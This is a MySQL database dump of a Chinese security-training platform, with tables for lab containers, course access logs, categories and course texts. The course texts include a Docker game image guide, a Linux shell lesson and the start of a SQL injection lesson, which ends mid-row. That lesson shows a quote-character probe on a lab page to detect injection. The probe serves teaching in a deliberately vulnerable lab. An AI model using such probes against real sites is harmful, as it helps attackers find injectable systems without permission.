/*
SQLyog Ultimate v8.32 
MySQL - 5.7.3-m13 : Database - platform
*********************************************************************
*/


/*!40101 SET NAMES utf8 */;

/*!40101 SET SQL_MODE=''*/;

/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
CREATE DATABASE /*!32312 IF NOT EXISTS*/`paltform1` /*!40100 DEFAULT CHARACTER SET latin1 */;

USE `paltform`;

/*Table structure for table `container` */

DROP TABLE IF EXISTS `container`;

CREATE TABLE `container` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `user_id` int(10) NOT NULL COMMENT '用户id',
  `course_id` int(11) NOT NULL COMMENT '课程id',
  `image` varchar(100) NOT NULL COMMENT '镜像名',
  `port` varchar(25) DEFAULT NULL COMMENT '端口号',
  `status` int(11) NOT NULL COMMENT '状态',
  `create_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  `cmd` varchar(100) DEFAULT NULL COMMENT '启动命令',
  `container_id` varchar(100) DEFAULT '',
  `domain` varchar(32) DEFAULT NULL COMMENT '二级域名',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COMMENT='容器状态表';

/*Data for the table `container` */

/*Table structure for table `course_access` */

DROP TABLE IF EXISTS `course_access`;

CREATE TABLE `course_access` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `user_id` int(10) NOT NULL COMMENT '用户id',
  `course_id` int(10) NOT NULL COMMENT '课程id',
  `state` tinyint(4) NOT NULL DEFAULT '1' COMMENT '状态',
  `create_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP COMMENT '创建时间',
  PRIMARY KEY (`id`),
  KEY `user_id` (`user_id`),
  KEY `course_id` (`course_id`)
) ENGINE=InnoDB AUTO_INCREMENT=2279 DEFAULT CHARSET=utf8 COMMENT='权限表';

/*Data for the table `course_access` */

insert  into `course_access`(`id`,`user_id`,`course_id`,`state`,`create_at`) values (1885,1,4,1,'2016-10-23 22:30:46'),(1886,930,16,1,'2016-10-24 09:56:19'),(1887,931,46,1,'2016-10-24 10:40:20'),(1888,931,48,1,'2016-10-24 10:40:25'),(1889,932,46,1,'2016-10-24 10:41:21'),(1890,932,48,1,'2016-10-24 10:41:26'),(1891,931,16,1,'2016-10-24 10:45:27'),(1892,931,17,1,'2016-10-24 10:47:10'),(1893,931,18,1,'2016-10-24 10:47:12'),(1894,931,19,1,'2016-10-24 10:47:14'),(1895,931,20,1,'2016-10-24 10:47:17'),(1896,931,21,1,'2016-10-24 10:47:20'),(1897,930,48,1,'2016-10-24 11:23:08'),(1898,930,46,1,'2016-10-24 11:23:19'),(1899,930,17,1,'2016-10-24 11:26:58'),(1900,930,4,1,'2016-10-24 12:41:12'),(1901,930,5,1,'2016-10-24 14:01:18'),(1902,930,61,1,'2016-10-24 14:01:33'),(1903,930,49,1,'2016-10-24 14:01:40'),(1904,930,50,1,'2016-10-24 14:01:51'),(1905,930,63,1,'2016-10-24 14:06:12'),(1906,930,64,1,'2016-10-24 14:06:19'),(1907,930,65,1,'2016-10-24 14:06:25'),(1908,930,66,1,'2016-10-24 14:06:32'),(1909,930,67,1,'2016-10-24 14:06:37'),(1910,930,68,1,'2016-10-24 14:06:45'),(1911,930,69,1,'2016-10-24 14:06:53'),(1912,930,70,1,'2016-10-24 14:07:06'),(1913,1,5,1,'2016-10-24 14:09:37'),(1914,932,49,1,'2016-10-24 15:16:42'),(1915,932,50,1,'2016-10-24 15:16:50'),(1916,932,51,1,'2016-10-24 15:16:57'),(1917,932,52,1,'2016-10-24 15:17:03'),(1918,932,53,1,'2016-10-24 15:17:09'),(1919,932,54,1,'2016-10-24 15:17:15'),(1920,932,55,1,'2016-10-24 15:17:23'),(1921,932,60,1,'2016-10-24 15:17:29'),(1922,932,59,1,'2016-10-24 15:17:35'),(1923,932,58,1,'2016-10-24 15:17:44'),(1924,932,57,1,'2016-10-24 15:17:54'),(1925,932,56,1,'2016-10-24 15:18:03'),(1926,933,16,1,'2016-10-26 09:52:37'),(1927,933,81,1,'2016-10-26 09:52:54'),(1928,933,49,1,'2016-10-26 09:53:29'),(1929,933,46,1,'2016-10-26 09:53:37'),(1930,933,48,1,'2016-10-26 09:53:47'),(1931,933,4,1,'2016-10-26 11:23:18'),(1932,930,82,1,'2016-10-26 11:30:10'),(1933,930,83,1,'2016-10-26 11:30:16'),(1934,930,84,1,'2016-10-26 11:30:25'),(1935,930,85,1,'2016-10-26 11:30:31'),(1936,930,86,1,'2016-10-26 11:35:45'),(1937,930,87,1,'2016-10-26 11:35:50'),(1938,930,89,1,'2016-10-26 11:35:57'),(1939,932,16,1,'2016-10-28 17:07:28'),(1940,932,17,1,'2016-10-28 17:07:31'),(1941,932,18,1,'2016-10-28 17:07:34'),(1942,932,19,1,'2016-10-28 17:07:36'),(1943,932,20,1,'2016-10-28 17:07:38'),(1944,932,21,1,'2016-10-28 17:07:47'),(1945,934,46,1,'2016-10-28 17:41:19'),(1946,934,48,1,'2016-10-28 17:41:25'),(1947,935,16,1,'2016-10-28 19:30:28'),(1948,935,17,1,'2016-10-28 19:30:30'),(1949,935,18,1,'2016-10-28 19:30:32'),(1950,935,19,1,'2016-10-28 19:30:34'),(1951,935,20,1,'2016-10-28 19:30:35'),(1952,935,21,1,'2016-10-28 19:30:37'),(1953,935,22,1,'2016-10-28 19:30:39'),(1954,935,49,1,'2016-10-28 19:30:47'),(1955,935,50,1,'2016-10-28 19:30:54'),(1956,935,51,1,'2016-10-28 19:30:59'),(1957,935,52,1,'2016-10-28 19:31:04'),(1958,935,53,1,'2016-10-28 19:31:07'),(1959,935,54,1,'2016-10-28 19:31:11'),(1960,935,55,1,'2016-10-28 19:31:14'),(1961,935,56,1,'2016-10-28 19:31:18'),(1962,935,57,1,'2016-10-28 19:31:25'),(1963,935,58,1,'2016-10-28 19:31:30'),(1964,935,59,1,'2016-10-28 19:31:38'),(1965,935,60,1,'2016-10-28 19:31:45'),(1966,934,49,1,'2016-10-30 20:54:22'),(1967,934,50,1,'2016-10-30 20:54:26'),(1968,934,51,1,'2016-10-30 20:54:32'),(1969,934,52,1,'2016-10-30 20:54:36'),(1970,934,53,1,'2016-10-30 20:54:43'),(1971,934,54,1,'2016-10-30 20:54:50'),(1972,934,55,1,'2016-10-30 20:54:54'),(1973,934,56,1,'2016-10-30 20:55:00'),(1974,934,57,1,'2016-10-30 20:55:04'),(1975,934,58,1,'2016-10-30 20:55:08'),(1976,934,59,1,'2016-10-30 20:55:15'),(1977,934,60,1,'2016-10-30 20:55:22'),(1978,930,34,1,'2016-10-31 11:23:16'),(1979,930,99,1,'2016-10-31 14:55:32'),(1980,930,98,1,'2016-10-31 14:55:36'),(1981,930,97,1,'2016-10-31 14:55:39'),(1982,930,96,1,'2016-10-31 14:55:42'),(1983,930,95,1,'2016-10-31 14:55:45'),(1984,930,94,1,'2016-10-31 14:55:49'),(1985,930,93,1,'2016-10-31 14:55:54'),(1986,930,92,1,'2016-10-31 14:56:00'),(1987,930,91,1,'2016-10-31 14:56:06'),(1988,930,90,1,'2016-10-31 14:56:11'),(1989,937,46,1,'2016-10-31 15:12:36'),(1990,937,48,1,'2016-10-31 15:12:42'),(1991,938,46,1,'2016-10-31 17:14:52'),(1992,938,48,1,'2016-10-31 17:14:57'),(1993,939,46,1,'2016-10-31 17:16:49'),(1994,939,48,1,'2016-10-31 17:16:57'),(1995,940,46,1,'2016-10-31 17:21:38'),(1996,940,48,1,'2016-10-31 17:21:47'),(1997,941,46,1,'2016-10-31 17:58:11'),(1998,941,48,1,'2016-10-31 17:58:18'),(1999,942,46,1,'2016-10-31 17:59:37'),(2000,942,48,1,'2016-10-31 17:59:45'),(2001,943,46,1,'2016-10-31 18:08:35'),(2002,943,48,1,'2016-10-31 18:08:41'),(2003,944,46,1,'2016-10-31 18:26:46'),(2004,944,48,1,'2016-10-31 18:26:53'),(2005,945,46,1,'2016-10-31 18:33:52'),(2006,945,48,1,'2016-10-31 18:33:56'),(2007,946,46,1,'2016-11-01 09:25:43'),(2008,946,48,1,'2016-11-01 09:25:50'),(2009,947,46,1,'2016-11-01 09:32:42'),(2010,947,48,1,'2016-11-01 09:32:50'),(2011,948,16,1,'2016-11-01 09:52:44'),(2012,948,17,1,'2016-11-01 09:52:47'),(2014,948,18,1,'2016-11-01 09:52:55'),(2015,948,19,1,'2016-11-01 09:52:58'),(2016,948,20,1,'2016-11-01 09:53:03'),(2017,948,21,1,'2016-11-01 09:53:07'),(2018,949,46,1,'2016-11-01 09:58:43'),(2019,949,48,1,'2016-11-01 09:58:49'),(2020,950,48,1,'2016-11-01 10:05:04'),(2021,950,46,1,'2016-11-01 10:05:10'),(2022,930,100,1,'2016-11-01 11:45:07'),(2023,930,101,1,'2016-11-01 12:30:59'),(2024,930,76,1,'2016-11-01 17:23:11'),(2025,951,46,1,'2016-11-01 18:07:56'),(2026,951,48,1,'2016-11-01 18:08:02'),(2027,952,46,1,'2016-11-02 14:12:10'),(2028,952,48,1,'2016-11-02 14:12:15'),(2029,953,46,1,'2016-11-02 15:00:01'),(2030,953,48,1,'2016-11-02 15:00:09'),(2031,954,46,1,'2016-11-02 15:02:02'),(2032,954,48,1,'2016-11-02 15:02:09'),(2033,955,46,1,'2016-11-02 15:32:33'),(2034,955,48,1,'2016-11-02 15:32:40'),(2035,933,101,1,'2016-11-02 16:34:22'),(2036,956,46,1,'2016-11-03 14:00:09'),(2037,956,48,1,'2016-11-03 14:00:15'),(2038,957,46,1,'2016-11-03 18:08:45'),(2039,957,48,1,'2016-11-03 18:08:52'),(2040,958,46,1,'2016-11-04 09:23:02'),(2041,958,48,1,'2016-11-04 09:23:08'),(2042,959,46,1,'2016-11-06 12:56:44'),(2043,959,48,1,'2016-11-06 12:56:51'),(2044,960,46,1,'2016-11-08 14:51:05'),(2045,960,48,1,'2016-11-08 14:51:11'),(2046,961,46,1,'2016-11-10 10:30:47'),(2047,961,48,1,'2016-11-10 10:30:54'),(2048,962,46,1,'2016-11-10 10:39:11'),(2049,962,48,1,'2016-11-10 10:39:17'),(2050,963,46,1,'2016-11-10 12:36:40'),(2051,963,48,1,'2016-11-10 12:36:47'),(2052,964,46,1,'2016-11-14 12:23:12'),(2053,964,48,1,'2016-11-14 12:23:17'),(2054,965,46,1,'2016-11-15 15:15:51'),(2055,965,48,1,'2016-11-15 15:15:57'),(2056,966,46,1,'2016-11-16 09:18:17'),(2057,966,48,1,'2016-11-16 09:18:22'),(2058,967,46,1,'2016-11-16 13:12:24'),(2059,967,48,1,'2016-11-16 13:12:31'),(2060,932,22,1,'2016-11-17 09:40:24'),(2061,932,23,1,'2016-11-17 09:40:29'),(2062,932,24,1,'2016-11-17 09:40:33'),(2063,932,25,1,'2016-11-17 09:40:40'),(2064,932,26,1,'2016-11-17 09:40:44'),(2065,932,27,1,'2016-11-17 09:40:51'),(2066,968,46,1,'2016-11-20 21:07:32'),(2067,968,48,1,'2016-11-20 21:07:37'),(2068,970,46,1,'2016-11-26 19:57:59'),(2069,970,48,1,'2016-11-26 19:58:05'),(2070,971,46,1,'2016-11-29 08:37:02'),(2071,971,48,1,'2016-11-29 08:37:07'),(2072,972,46,1,'2016-12-01 16:36:43'),(2073,972,48,1,'2016-12-01 16:36:48'),(2074,973,46,1,'2016-12-08 20:53:03'),(2075,973,48,1,'2016-12-08 20:53:13'),(2076,974,46,1,'2016-12-09 09:36:45'),(2077,974,48,1,'2016-12-09 09:36:51'),(2078,975,46,1,'2016-12-09 09:46:47'),(2079,975,48,1,'2016-12-09 09:46:56'),(2080,976,46,1,'2016-12-09 09:48:41'),(2081,976,48,1,'2016-12-09 09:48:49'),(2082,977,46,1,'2016-12-09 09:51:26'),(2083,977,48,1,'2016-12-09 09:51:33'),(2084,978,46,1,'2016-12-09 10:10:45'),(2085,978,48,1,'2016-12-09 10:10:50'),(2086,979,46,1,'2016-12-09 10:21:06'),(2087,979,48,1,'2016-12-09 10:21:15'),(2088,980,46,1,'2016-12-09 13:35:23'),(2089,980,48,1,'2016-12-09 13:35:29'),(2090,932,28,1,'2016-12-14 08:21:41'),(2091,932,29,1,'2016-12-14 08:21:59'),(2092,932,30,1,'2016-12-14 08:22:06'),(2093,932,31,1,'2016-12-14 08:22:15'),(2094,932,32,1,'2016-12-14 08:22:19'),(2095,932,33,1,'2016-12-14 08:22:24'),(2096,932,35,1,'2016-12-14 08:22:31'),(2097,981,46,1,'2016-12-14 15:58:50'),(2098,981,48,1,'2016-12-14 15:58:55'),(2099,981,16,1,'2016-12-14 18:54:38'),(2100,981,17,1,'2016-12-14 18:54:41'),(2101,981,18,1,'2016-12-14 18:54:44'),(2102,981,19,1,'2016-12-14 18:54:47'),(2103,969,16,1,'2016-12-14 18:59:33'),(2104,969,17,1,'2016-12-14 18:59:34'),(2105,969,18,1,'2016-12-14 18:59:35'),(2106,969,19,1,'2016-12-14 18:59:37'),(2107,969,20,1,'2016-12-14 18:59:37'),(2108,969,21,1,'2016-12-14 18:59:39'),(2109,969,22,1,'2016-12-14 18:59:42'),(2110,969,4,1,'2016-12-14 18:59:45'),(2111,969,5,1,'2016-12-14 18:59:46'),(2112,982,46,1,'2016-12-20 08:33:39'),(2113,982,48,1,'2016-12-20 08:33:45'),(2114,983,46,1,'2016-12-22 19:45:28'),(2115,983,48,1,'2016-12-22 19:45:33'),(2116,984,16,1,'2016-12-26 08:58:52'),(2117,984,17,1,'2016-12-26 08:58:56'),(2118,984,18,1,'2016-12-26 08:59:01'),(2119,984,19,1,'2016-12-26 08:59:04'),(2120,984,20,1,'2016-12-26 08:59:07'),(2121,984,21,1,'2016-12-26 08:59:09'),(2122,984,49,1,'2016-12-26 08:59:16'),(2123,984,50,1,'2016-12-26 08:59:24'),(2124,984,51,1,'2016-12-26 08:59:29'),(2125,984,52,1,'2016-12-26 08:59:35'),(2126,984,53,1,'2016-12-26 08:59:40'),(2127,984,54,1,'2016-12-26 08:59:46'),(2128,984,55,1,'2016-12-26 08:59:51'),(2129,984,56,1,'2016-12-26 08:59:57'),(2130,984,57,1,'2016-12-26 09:00:03'),(2131,984,58,1,'2016-12-26 09:00:09'),(2132,984,59,1,'2016-12-26 09:00:15'),(2133,984,60,1,'2016-12-26 09:00:20'),(2134,982,49,1,'2016-12-28 11:08:10'),(2135,982,50,1,'2016-12-28 11:08:29'),(2136,982,51,1,'2016-12-28 11:08:34'),(2137,982,52,1,'2016-12-28 11:08:39'),(2138,982,53,1,'2016-12-28 11:08:45'),(2139,982,54,1,'2016-12-28 11:08:52'),(2140,982,55,1,'2016-12-28 11:08:58'),(2141,982,56,1,'2016-12-28 11:09:04'),(2142,982,57,1,'2016-12-28 11:09:09'),(2143,982,58,1,'2016-12-28 11:09:15'),(2144,982,59,1,'2016-12-28 11:09:25'),(2145,982,60,1,'2016-12-28 11:09:31'),(2146,930,102,1,'2016-12-29 13:19:03'),(2147,933,102,1,'2016-12-29 13:42:35'),(2148,959,102,1,'2016-12-30 12:34:15'),(2149,985,46,1,'2016-12-30 12:45:37'),(2150,985,48,1,'2016-12-30 12:45:43'),(2151,986,46,1,'2016-12-30 14:34:37'),(2152,986,48,1,'2016-12-30 14:34:45'),(2153,987,46,1,'2016-12-30 15:41:25'),(2154,987,48,1,'2016-12-30 15:41:32'),(2155,988,46,1,'2016-12-30 15:47:30'),(2156,988,48,1,'2016-12-30 15:47:35'),(2157,989,46,1,'2016-12-30 16:05:06'),(2158,989,48,1,'2016-12-30 16:05:10'),(2159,990,46,1,'2017-01-03 19:01:18'),(2160,990,48,1,'2017-01-03 19:01:24'),(2161,991,46,1,'2017-01-03 19:32:02'),(2162,991,48,1,'2017-01-03 19:32:07'),(2163,992,46,1,'2017-01-04 08:24:48'),(2164,992,48,1,'2017-01-04 08:24:53'),(2165,993,46,1,'2017-01-04 16:22:43'),(2166,993,48,1,'2017-01-04 16:22:48'),(2167,994,46,1,'2017-01-06 14:18:06'),(2168,994,48,1,'2017-01-06 14:18:11'),(2169,995,46,1,'2017-01-11 16:08:15'),(2170,995,48,1,'2017-01-11 16:08:25'),(2171,950,16,1,'2017-01-12 15:50:29'),(2172,950,17,1,'2017-01-12 15:50:31'),(2173,950,18,1,'2017-01-12 15:50:37'),(2174,950,19,1,'2017-01-12 15:50:40'),(2175,950,20,1,'2017-01-12 15:50:43'),(2176,950,21,1,'2017-01-12 15:50:48'),(2177,950,22,1,'2017-01-12 15:51:07'),(2178,950,23,1,'2017-01-12 15:51:12'),(2179,950,24,1,'2017-01-12 15:51:17'),(2180,950,25,1,'2017-01-12 15:51:21'),(2181,950,26,1,'2017-01-12 15:51:26'),(2182,950,27,1,'2017-01-12 15:51:31'),(2183,950,49,1,'2017-01-12 15:51:45'),(2184,950,50,1,'2017-01-12 15:51:51'),(2185,950,51,1,'2017-01-12 15:51:56'),(2186,950,52,1,'2017-01-12 15:52:03'),(2187,950,53,1,'2017-01-12 15:52:08'),(2188,950,54,1,'2017-01-12 15:52:14'),(2189,950,55,1,'2017-01-12 15:52:20'),(2190,950,56,1,'2017-01-12 15:52:27'),(2191,950,57,1,'2017-01-12 15:52:32'),(2192,950,58,1,'2017-01-12 15:52:37'),(2193,950,59,1,'2017-01-12 15:52:42'),(2194,950,60,1,'2017-01-12 15:52:47'),(2195,996,46,1,'2017-01-16 13:28:54'),(2196,996,48,1,'2017-01-16 13:28:59'),(2197,997,46,1,'2017-02-05 20:17:20'),(2198,997,48,1,'2017-02-05 20:17:32'),(2199,997,16,1,'2017-02-05 20:17:39'),(2200,998,46,1,'2017-02-08 21:53:21'),(2201,998,48,1,'2017-02-08 21:53:29'),(2202,999,46,1,'2017-02-17 09:09:08'),(2203,999,48,1,'2017-02-17 09:09:12'),(2204,1000,46,1,'2017-02-27 19:55:53'),(2205,1000,48,1,'2017-02-27 19:56:07'),(2206,1001,46,1,'2017-02-28 16:32:12'),(2207,1001,48,1,'2017-02-28 16:32:21'),(2208,1002,46,1,'2017-03-03 13:18:01'),(2209,1002,48,1,'2017-03-03 13:18:07'),(2210,1003,46,1,'2017-03-03 22:27:24'),(2211,1003,48,1,'2017-03-03 22:27:29'),(2212,934,16,1,'2017-03-08 16:35:38'),(2213,934,17,1,'2017-03-08 16:35:41'),(2214,934,18,1,'2017-03-08 16:35:43'),(2215,934,19,1,'2017-03-08 16:35:44'),(2216,934,20,1,'2017-03-08 16:35:46'),(2217,934,21,1,'2017-03-08 16:35:49'),(2218,934,22,1,'2017-03-08 16:35:53'),(2219,934,23,1,'2017-03-08 16:35:56'),(2220,934,24,1,'2017-03-08 16:36:00'),(2221,934,25,1,'2017-03-08 16:36:03'),(2222,934,26,1,'2017-03-08 16:36:10'),(2223,934,27,1,'2017-03-08 16:36:14'),(2224,934,28,1,'2017-03-08 16:36:18'),(2225,934,29,1,'2017-03-08 16:36:22'),(2226,934,30,1,'2017-03-08 16:36:26'),(2227,934,31,1,'2017-03-08 16:36:32'),(2228,934,32,1,'2017-03-08 16:36:35'),(2229,934,33,1,'2017-03-08 16:36:47'),(2230,934,35,1,'2017-03-08 16:36:56'),(2231,934,36,1,'2017-03-08 16:37:04'),(2232,934,37,1,'2017-03-08 16:37:08'),(2233,934,38,1,'2017-03-08 16:37:14'),(2234,934,39,1,'2017-03-08 16:37:19'),(2235,934,40,1,'2017-03-08 16:37:26'),(2236,934,41,1,'2017-03-08 16:37:32'),(2237,934,42,1,'2017-03-08 16:37:37'),(2238,934,44,1,'2017-03-08 16:37:42'),(2239,934,43,1,'2017-03-08 16:37:45'),(2240,934,45,1,'2017-03-08 16:37:51'),(2241,934,47,1,'2017-03-08 16:38:04'),(2242,1004,46,1,'2017-03-10 08:59:34'),(2243,1004,48,1,'2017-03-10 08:59:43'),(2244,930,43,1,'2017-03-10 14:34:23'),(2245,1005,46,1,'2017-03-13 09:07:58'),(2246,1005,48,1,'2017-03-13 09:08:05'),(2247,1006,46,1,'2017-03-15 16:01:00'),(2248,1006,48,1,'2017-03-15 16:01:07'),(2249,1007,90,1,'2017-03-21 17:20:21'),(2251,1007,92,1,'2017-03-21 17:20:46'),(2252,1007,89,1,'2017-03-21 17:21:04'),(2253,1007,91,1,'2017-03-21 17:21:15'),(2254,1007,93,1,'2017-03-21 17:21:22'),(2255,1007,94,1,'2017-03-21 17:21:29'),(2256,1007,95,1,'2017-03-21 17:21:37'),(2257,1007,96,1,'2017-03-21 17:21:47'),(2258,1007,97,1,'2017-03-21 17:21:54'),(2259,1007,98,1,'2017-03-21 17:22:01'),(2260,1007,99,1,'2017-03-21 17:22:15'),(2261,1007,34,1,'2017-03-21 17:22:24'),(2262,1009,46,1,'2017-03-21 17:33:58'),(2263,1009,48,1,'2017-03-21 17:34:03'),(2264,1010,16,1,'2017-03-21 17:39:39'),(2265,930,33,1,'2017-03-25 15:40:50'),(2266,930,39,1,'2017-03-29 10:36:03'),(2267,930,40,1,'2017-03-29 10:36:24'),(2268,930,31,1,'2017-03-29 12:00:07'),(2269,930,32,1,'2017-03-29 12:00:13'),(2270,930,47,1,'2017-03-29 13:52:28'),(2271,930,22,1,'2017-04-01 10:43:06'),(2272,930,28,1,'2017-04-01 10:58:35'),(2273,1011,46,1,'2017-04-07 17:18:22'),(2274,1011,48,1,'2017-04-07 17:18:32'),(2275,1012,46,1,'2017-04-07 17:27:31'),(2276,1012,48,1,'2017-04-07 17:27:36'),(2277,1013,46,1,'2017-04-10 17:44:08'),(2278,1013,48,1,'2017-04-10 17:44:13');

/*Table structure for table `course_category` */

DROP TABLE IF EXISTS `course_category`;

CREATE TABLE `course_category` (
  `id` int(11) unsigned NOT NULL AUTO_INCREMENT,
  `cate_name` varchar(30) NOT NULL COMMENT '分类名称',
  `parent_id` int(11) NOT NULL DEFAULT '0' COMMENT '分类父类id',
  `sort_order` tinyint(3) NOT NULL DEFAULT '0' COMMENT '顺序',
  `code` varchar(20) DEFAULT NULL COMMENT '分类的代码标识',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;

/*Data for the table `course_category` */

insert  into `course_category`(`id`,`cate_name`,`parent_id`,`sort_order`,`code`) values (1,'移动安全',0,2,''),(2,'web安全',0,1,''),(3,'系统安全',0,3,''),(4,'php课程',0,4,''),(5,'CTF课程',0,100,'');

/*Table structure for table `courses` */

DROP TABLE IF EXISTS `courses`;

CREATE TABLE `courses` (
  `id` int(10) NOT NULL AUTO_INCREMENT,
  `name` varchar(50) NOT NULL COMMENT '名字',
  `description` varchar(255) DEFAULT NULL COMMENT '描述',
  `report` text,
  `category` int(10) DEFAULT '0' COMMENT '分类id',
  `url` varchar(100) NOT NULL COMMENT '链接',
  `image` varchar(100) NOT NULL COMMENT '镜像',
  `create_at` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `state` tinyint(1) NOT NULL DEFAULT '1' COMMENT '状态1表公开',
  `config` text,
  `analysis` text COMMENT '课程分析',
  `is_web` tinyint(1) NOT NULL DEFAULT '0' COMMENT '是否是web镜像',
  `afterclass` text COMMENT '课后扩展',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=103 DEFAULT CHARSET=utf8 COMMENT='课程表';

/*Data for the table `courses` */

insert  into `courses`(`id`,`name`,`description`,`report`,`category`,`url`,`image`,`create_at`,`state`,`config`,`analysis`,`is_web`,`afterclass`) values (4,'一些童年里的游戏','年少的游戏梦，瑰丽而又美好。培养情操，放松心情，家庭常备，出门远行，随时消遣。','#**一些童年里的游戏**\r\n集成了超级玛丽，坦克大战，吃豆人经典游戏。\r\n###0x01 镜像说明\r\n#####本镜像是一个集成了超级玛丽、坦克大战、吃豆人的经典游戏的应用，在您加班之余，或者休息之时，又或亲朋好友回味童年之时，即可创建服务，迅速开几把，结束之后，迅速结束服务，培养情操，锻炼意志，放松心情，家庭常备，出门远行随时消遣。\r\n\r\n###0x02 部署说明\r\n\r\n1.安装并测试Docker，可以参考[官方文档](https://docs.docker.com/installation/ubuntulinux/)。或者是《Docker入门与实践》[安装](http://yeasy.gitbooks.io/docker_practice/content/install/index.html)一节。\r\n\r\n2.拉取镜像\r\n\r\n    docker pull index.alauda.cn/dubuqingfeng/docker-web-game\r\n\r\n3.运行容器\r\n\r\n    docker run -i -t -p 80:80 index.alauda.cn/dubuqingfeng/docker-web-game\r\n\r\n3.测试运行\r\n\r\n    docker ps -a\r\n\r\n如果出现```up```即为安装成功。\r\n\r\n###0x03 平台部署说明\r\n\r\n1.选择这个镜像，点击创建服务。\r\n\r\n2.进入控制台，查看地址，点击地址运行。\r\n\r\n###0x04 致谢\r\n\r\n童年，以及所有给我们带来美好的人。\r\n\r\n###0x05 后续思考\r\n\r\n有什么后续思考呢？欢迎一块回味童年，又或组织一些业余Dota赛，又或组织一些童年的环境。\r\n\r\n珍惜拥有。\r\n\r\n###0x06 反馈\r\n\r\n####协议\r\n####更新记录\r\n####反馈\r\n\r\n###0x07 后记\r\n\r\n那年年少，虽是无知，可却令人回味无穷。\r\n\r\n亦越行越远，此时的我们为了理想和现实而奋斗。\r\n\r\n却忘了那些角落里残留的游戏卡。\r\n\r\n却忘了那些伴我同行的哆啦A梦越走越远。\r\n\r\n那些经历让一个懵懂的小孩逐渐成长。\r\n\r\n也让一位在事业打拼的人士意味深长。\r\n\r\n//曾经和她一起去大学自习室，一起吃饭，一起逛校园，一起逛街，一起看天上的星星，一起讨论着未来。\r\n\r\n还是否依稀记得当初。\r\n\r\n当初的美梦已离开。\r\n\r\n留给我们的只是瑰丽的回忆。\r\n\r\n最后以一首曾是拥有作为结束，希望不忘初心。\r\n\r\nhttps://www.youtube.com/watch?v=W393coF35GY',2,'http://oda8mr8yr.bkt.clouddn.com/%E6%B8%B8%E6%88%8F1.png','index.tenxcloud.com/dubuqingfeng/docker-web-test:latest','2016-08-02 16:05:59',1,'','',1,''),(5,'linux基础课程训练一','linux基础bash命令测试课程','<dt>Shell语法 基础命令<br></dt><dt>说明：我虚拟环境使用的是ubuntu14.4.04,可以通过 cat /etc/issue来查看，对于ubuntu系统在做操作之前先更新一下系统使用命令apt-get update命令。如果发现测试的命令找不到</dt><dt><br></dt><dt>可以使用apt-get install -y 命令 先插入这个命令再去运行试一试。比如man命令可能运行不了。apt-get install -y man 之后就可以正常使用了。</dt><dt><br></dt><dt>我们建议学员在自己的机器装虚拟机然后在虚拟机中装相应的linux系统做操作练习。</dt><dt><br></dt><dd><dl><dd><span>bash shell语法</span><br><br>ls -l /<br>命令 选项 参数<br><br><span>命令：整条shell命令的主体<br>选项：会影响或微调命令的行为<br>参数：命令作用的对象</span><br><br>===============================================<br><br><span>1. 自动补全（命令，参数是文件或路径）</span><br>ls /etc/sysconfig/<br>service network restart<br>ls /etc/sysconfig/network-scripts/<br><br>===============================================<br><br><span>2. 快捷键</span><br>^c ^l ^d ^a ^e<br><br>ctrl + l	清屏<br>ctrl + c	中断<br>ctrl + a	到命令行首<br>ctrl + e	到命令行尾<br><br>================================================<br><br><span>3. 历史命令</span><br>光标上下键<br>tab键<br>^r (输入一段某条命令的关键字：一定是连续的)<br>!number,例如!20 （先histroy）<br>!757 执行757条命令<br>!string,例如!ser<br>!!在执行一次上一条命令<br>!$引用上一条命令最后一个参数<br>alt . 上一条命令最后一个参数(可以向上)<br>$$ 当前shell的进程pid<br>$? 值为0 上一条命令为正确输出<br><br>[root@station230 ~]# ls /home/<br>[root@station230 ~]# cd !$<br><br>=======================================================<br><br><span>4. 别名</span><br># ls /etc/sysconfig/network-scripts/<br># alias lsnet=\\\'ls /etc/sysconfig/network-scripts/\\\' //临时<br># lsnet<br># alias<br># unalias lsnet<br><br>=========================================================<br><br><span>5. shell查找命令的顺序</span><br>是否是内置命令<br>是否是别名<br>是否在磁盘上能找到<br></dd><dt>Linux帮助</dt><dd><span>Linux获得帮助<br><br></span>=======================================================<span><br></span><br><span>1. 命令 --help</span><br># ls --help<br>用法：ls [选项]... [文件]...<br><br>=======================================================<br><br><span>2. man(Manual手册)<span>&nbsp;</span></span>不仅可以看命令帮助，还可以看服务配置文件的帮助<br>/usr/bin/passwd	设置口令<br>/etc/passwd	保存用户信息的文件<br><br>man 1 用户命令<br>man 2 系统调用<br>man 3 库调用<br>man 4 特殊文件<br>man 5 配置文件<br>man 6 游戏<br>man 7 杂项<br>man 8 系统命令<br>man 9 内核参考<br><br>man -f passwd 查询passwd命令在那些章节有相应的说明<br>makewhatis 维护man<br>man -k passwd 模糊查询和passwd关键字相关的所有信息<br><br>man 1 passwd<br>man 5 passwd<br><br>man -k \"passwd\"<br>man -k \"_selinux\" man 8 ftpd_selinux<br><br>==========================================================<br><br><span>3. /usr/share/doc 文档</span><br>ls /usr/share/doc/pam-0.99.6.2/</dd></dl></dd><p><br></p>',3,'http://oda8mr8yr.bkt.clouddn.com/ubuntu14.04.jpeg','index.alauda.cn/library/ubuntu:14.04.4','2016-10-23 22:25:12',1,NULL,NULL,0,NULL),(16,'SQL注入基础训练一','通过攻防教学实验系统中的web系统做简单的sql注入学习，从而理解sql注入的基本原理。','<p>1）&nbsp;判断注入点</p><pre><code>vulnerabilities/web/Sql/sqli_base/index.php?id=1%27 爆错说明注入存在</code></pre><p><img style=\"max-width:100%;\" 